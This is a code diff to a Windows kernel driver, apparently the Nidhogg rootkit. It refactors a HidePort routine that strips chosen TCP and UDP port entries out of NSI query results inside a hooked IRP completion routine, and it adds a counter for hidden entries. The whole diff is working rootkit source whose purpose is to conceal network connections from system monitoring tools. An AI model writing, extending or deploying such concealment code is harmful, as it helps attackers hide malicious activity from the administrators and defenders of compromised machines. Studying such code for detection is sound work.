@@ -78,6 +78,52 @@ NTSTATUS NetworkUtils::UninstallNsiHook() {
 
 /*
 * Description:
+* HidePort is responsible to hide a port from the Nsi entries.
+* 
+* Parameters:
+* @entries		  [PVOID]			   -- Pointer to the entries.
+* @nsiParameter	  [PNSI_PARAM]		   -- Pointer to the Nsi parameters.
+* @statusEntries  [PNSI_STATUS_ENTRY]  -- Pointer to the status entries.
+* @processEntries [PNSI_PROCESS_ENTRY] -- Pointer to the process entries.
+* @index		  [SIZE_T]			   -- Index of the entry to hide.
+* 
+* Returns:
+* There is no return value.
+*/
+void HidePort(PVOID entries, PNSI_PARAM nsiParameter, PNSI_STATUS_ENTRY statusEntries,
+	PNSI_PROCESS_ENTRY processEntries, SIZE_T index) {
+	PUCHAR pEntries = reinterpret_cast<PUCHAR>(entries);
+
+	if (index + 1 >= nsiParameter->Count) {
+		RtlSecureZeroMemory(pEntries + index * nsiParameter->EntrySize, nsiParameter->EntrySize);
+
+		if (statusEntries)
+			RtlSecureZeroMemory(&statusEntries[index], sizeof(NSI_STATUS_ENTRY));
+
+		if (processEntries)
+			RtlSecureZeroMemory(&processEntries[index], nsiParameter->ProcessEntrySize);
+	}
+
+	else {
+		SIZE_T bytesToMove = (nsiParameter->Count - (index + 1)) * nsiParameter->EntrySize;
+		RtlMoveMemory(pEntries + index * nsiParameter->EntrySize, pEntries + (index + 1) * nsiParameter->EntrySize, bytesToMove);
+
+		if (statusEntries) {
+			SIZE_T bytesToMoveStatus = (nsiParameter->Count - (index + 1)) * sizeof(NSI_STATUS_ENTRY);
+			RtlMoveMemory(&statusEntries[index], &statusEntries[index + 1], bytesToMoveStatus);
+		}
+
+		if (processEntries) {
+			SIZE_T bytesToMoveProcess = (nsiParameter->Count - (index + 1)) * nsiParameter->ProcessEntrySize;
+
+			RtlMoveMemory(&processEntries[index], &processEntries[index + 1], bytesToMoveProcess);
+		}
+	}
+	nsiParameter->Count--;
+}
+
+/*
+* Description:
 * NsiIrpComplete is responsible to handle IRP completion for the hooked Nsi dispatch function.
 *
 * Parameters:
@@ -109,34 +155,6 @@ NTSTATUS NsiIrpComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
 				PNSI_STATUS_ENTRY statusEntries = (PNSI_STATUS_ENTRY)nsiParameter->StatusEntries;
 				PNSI_PROCESS_ENTRY processEntries = (PNSI_PROCESS_ENTRY)nsiParameter->ProcessEntries;
 
-				auto HidePort = [](PVOID Entries, PNSI_PARAM nsiParameter, PNSI_STATUS_ENTRY statusEntries,
-					PNSI_PROCESS_ENTRY processEntries, SIZE_T i) {
-						USHORT entriesIndex = i + 1;
-
-						if (!&((PUCHAR)Entries)[entriesIndex])
-							entriesIndex = i - 1;
-
-						RtlMoveMemory(&((PUCHAR)Entries)[i], &((PUCHAR)Entries)[entriesIndex], (nsiParameter->Count - entriesIndex) * nsiParameter->EntrySize);
-
-						if (statusEntries) {
-							entriesIndex = i + 1;
-
-							if (!&statusEntries[entriesIndex])
-								entriesIndex = i - 1;
-							
-							RtlMoveMemory(&statusEntries[i], &statusEntries[entriesIndex], (nsiParameter->Count - entriesIndex) * sizeof(NSI_STATUS_ENTRY));
-						}
-
-						if (processEntries) {
-							entriesIndex = i + 1;
-
-							if (!&processEntries[entriesIndex])
-								entriesIndex = i - 1;
-
-							RtlMoveMemory(&processEntries[i], &processEntries[entriesIndex], (nsiParameter->Count - entriesIndex) * nsiParameter->ProcessEntrySize);
-						}
-				};
-
 				for (SIZE_T i = 0; i < nsiParameter->Count; i++) {
 					if (nsiParameter->Type == COMUNICATION_TYPE::TCP) {
 						// Edge case of somehow the entries list is empty or invalid address of entry.
@@ -163,6 +181,7 @@ NTSTATUS NsiIrpComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
 
 							if (NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
 								HidePort(tcpEntries, nsiParameter, statusEntries, processEntries, i);
+								entriesHidden++;
 							}
 						}
 						__except (EXCEPTION_EXECUTE_HANDLER) {}
@@ -183,6 +202,7 @@ NTSTATUS NsiIrpComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
 
 							if (NidhoggNetworkUtils->FindHiddenPort(hiddenPort)) {
 								HidePort(udpEntries, nsiParameter, statusEntries, processEntries, i);
+								entriesHidden++;
 							}
 						}
 						__except (EXCEPTION_EXECUTE_HANDLER) { }
@@ -196,10 +216,7 @@ NTSTATUS NsiIrpComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
 	
 	if (context->OriginalCompletionRoutine) {
 		PIO_COMPLETION_ROUTINE originalRoutine = context->OriginalCompletionRoutine;
-		PVOID originalContext = NULL;
-
-		if (context->OriginalContext)
-			originalContext = context->OriginalContext;
+		PVOID originalContext = context->OriginalContext;
 
 		ExFreePoolWithTag(Context, DRIVER_TAG);
 		return originalRoutine(DeviceObject, Irp, originalContext);
